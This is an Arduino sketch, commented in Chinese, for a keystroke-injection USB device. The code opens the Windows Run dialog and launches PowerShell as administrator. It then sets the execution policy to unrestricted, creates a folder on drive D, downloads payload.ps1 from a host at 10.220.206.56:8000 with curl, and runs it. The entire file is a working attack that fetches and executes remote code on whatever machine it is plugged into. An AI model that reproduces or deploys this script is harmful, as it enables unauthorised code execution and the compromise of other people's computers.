#include <Keyboard.h>

void sendCmd(const char* sequence) {  // 输入并回车
  Keyboard.println(sequence);
  delay(500);
}

void switchCapsLock() {  // 切换Caps Lock
  Keyboard.press(KEY_CAPS_LOCK);
  delay(200);
  Keyboard.releaseAll();
  delay(200);
}

void setup() {
  Keyboard.begin();
  delay(1000);

  // 打开运行对话框
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(1000);
  
  // 打开PowerShell，Ctrl + Shift + Enter以管理员身份运行PowerShell
  switchCapsLock();  // 打开 Caps Lock
  Keyboard.print("powershell");  // println会多输入一个换行符
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);

  // 执行命令
  sendCmd("set-executionpolicy unrestricted");  // 更改执行策略
  sendCmd("Y");  // 确认更改
  sendCmd("get-executionpolicy");  // 查看执行策略
  sendCmd("mkdir d:/test");  // 在D盘下创建test文件夹
  sendCmd("curl -o d:/test/ciallo.ps1 10.220.206.56:8000/payload.ps1");  // 下载文件
  sendCmd("d:/test/ciallo.ps1");  // 执行文件

  switchCapsLock();  // 关闭 Caps Lock
  Keyboard.end();
}

void loop() {
// put your main code here, to run repeatedly:
}
